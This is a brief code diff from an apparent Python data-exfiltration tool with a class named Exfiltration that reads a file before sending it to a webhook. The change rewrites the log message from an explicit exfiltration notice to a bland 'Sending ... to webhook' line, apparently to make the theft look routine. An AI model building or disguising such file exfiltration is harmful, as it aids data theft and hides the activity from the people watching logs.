@@ -21,7 +21,7 @@ class Exfiltration:
         
         file_size = os.path.getsize(filepath)
         if on_output:
-            on_output(f"[EXFIL] INITIATING_WEBHOOK_EXFILTRATION: {filepath} ({file_size} bytes)")
+            on_output(f"Sending {filepath} to webhook ({file_size} bytes)")
 
         try:
             with open(filepath, 'rb') as f:
